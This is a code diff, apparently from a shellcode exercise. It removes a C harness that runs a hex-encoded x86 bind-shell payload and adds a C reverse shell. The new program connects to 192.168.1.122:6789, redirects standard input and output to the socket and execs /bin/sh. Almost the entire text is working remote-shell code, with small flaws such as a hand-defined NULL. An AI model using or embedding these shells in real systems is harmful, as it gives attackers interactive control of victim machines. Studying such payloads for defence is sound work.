@@ -27,21 +27,45 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
+ 
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 
-#include <stdio.h>
-#include <string.h>
+#define NULL 0
 
-unsigned char code[] = "\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x5b\x43\x66\x68\x1a\x85\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x57\x89\xe1\xcd\x80\xb0\x66\xfe\xc3\x52\x52\x57\x89\xe1\xcd\x80\x31\xc9\x89\xc3\xb0\x3f\xcd\x80\xb0\x3f\x41\x83\xf9\x02\x7e\xf6\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\xb0\x06\x89\xfb\xcd\x80";
+int socket(int domain, int type, int protocol);
+int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+int dup2(int oldfd, int newfd);
+int execve(const char *filename, char *const argv[], char *const envp[]);
+int close(int fd);
 
-main()
-{
+int main() {
+    char* address = "192.168.1.122";
+    int port = 6789;
+    
+    /* this creates a new socket but it has no address assigned to it yet */
+    int sockfd = socket(AF_INET /* 2 */, SOCK_STREAM /* 1 */, 0);
 
-	printf("Shellcode Length:  %d\n", strlen(code));
+    /* create sockaddr_in structure for use with connect function */
+    struct sockaddr_in sock_in;
+    sock_in.sin_family = AF_INET;
+    sock_in.sin_addr.s_addr = inet_addr(address);
+    sock_in.sin_port = htons(port);
 
-	int (*ret)() = (int(*)())code;
+    /* perform connect to target IP address and port */
+    connect(sockfd, (struct sockaddr*)&sock_in, sizeof(struct sockaddr_in));
 
-	ret();
+    /* duplicate file descriptors for STDIN/STDOUT/STDERR */
+    for (int n = 0; n <= 2; ++n) {
+        dup2(sockfd, n);
+    }
 
+    /* execute /bin/sh */
+    execve("/bin/sh", NULL, NULL);
+
+    close(sockfd);
+
+    return 0;
 }
 
-	
